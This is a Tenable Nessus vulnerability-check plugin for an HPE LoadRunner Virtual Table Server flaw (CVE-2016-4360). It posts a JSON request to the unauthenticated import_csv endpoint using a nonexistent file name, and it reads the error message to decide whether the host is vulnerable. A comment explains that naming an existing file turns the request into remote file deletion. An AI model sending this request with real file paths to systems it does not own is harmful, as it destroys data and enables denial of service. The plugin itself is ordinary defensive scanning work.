#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(91973);
  script_version('$Revision: 1.5 $');
  script_cvs_date("$Date: 2017/03/21 03:23:57 $");

  script_cve_id("CVE-2016-4360");
  script_osvdb_id(139286);
  script_xref(name:"ZDI", value:"ZDI-16-364");
  script_xref(name:"HP", value:"HPSBGN03609");
  script_xref(name:"HP", value:"PSRT110032");
  script_xref(name:"HP", value:"emr_na-c05157423");
  script_xref(name:"TRA", value:"TRA-2016-17");

  script_name(english:"HPE LoadRunner Virtual Table Server import_csv Remote File Deletion DoS");
  script_summary(english:"Attempts to delete a nonexistent file.");

  script_set_attribute(attribute:"synopsis", value:
"A software performance testing application running on the remote host
is affected by a denial of service vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Hewlett Packard Enterprise (HPE) LoadRunner Virtual Table Server
application running on the remote host is affected by a flaw in the
import_csv feature due to a failure to restrict file paths sent to an
unlink call. An unauthenticated, remote attacker can exploit this to
delete arbitrary files on the remote system, resulting in a denial of
service condition.

Note that LoadRunner reportedly is affected by other vulnerabilities,
which can result in a denial of service or remote code execution;
however, Nessus has not tested for these.");
  # http://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c05157423
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a216ffbd");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate patch or upgrade according to the vendor
advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/06/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/05/31");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/07/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:loadrunner");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"General");

  script_copyright(english:"This script is Copyright (C) 2016-2017 Tenable Network Security, Inc.");

  script_dependencies("hp_vts_detect.nasl");
  script_require_keys("installed_sw/HP Virtual Table Server");
  script_require_ports("Services/www", 4000);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

appname = "HP Virtual Table Server";

# Plugin will exit if VTS is not detected on the host
get_install_count(app_name:appname, exit_if_zero:TRUE);

# Branch off each http port
# Plugin will exit if VTS is not detected on this http port
port = get_http_port(default:4000);
install = get_single_install(
  app_name            : appname,
  port                : port
);

dir = install["path"];
install_url =  build_url(port:port, qs:dir);

# To attack, specify an existing file with full path 
charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
file = 'no_such_file_' + rand_str(length:16, charset: charset);
postdata = '{"separator":"\\t","path":"' + file + '"}'; 

res = http_send_recv3(
  port            : port,
  method          : "POST",
  item            : "/data/import_csv",
  data            : postdata,
  content_type    : "application/json",
  exit_on_fail    : TRUE
);

if(res[0] !~ "^HTTP/[0-9.]+ 200") 
  audit(AUDIT_RESP_BAD, port, 'a POST request: Unexpected HTTP response status code');

if(! res[2])
  audit(AUDIT_RESP_BAD, port, 'a POST request: No message body in the HTTP response');

if(res[2] =~ "no such file or directory.*" + file)
{
  report = 
    '\n  URL           : ' + install_url +
    '\n  Fixed version : 12.53' +
    '\n';
  security_report_v4(
    port:       port,
    severity:   SECURITY_WARNING,
    extra: report
  );
}
else if(res[2] =~ "Cannot access file.*" + file)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, install_url);
else
  audit(AUDIT_RESP_BAD, port, 'a POST request. Response: \n' + res[2]);
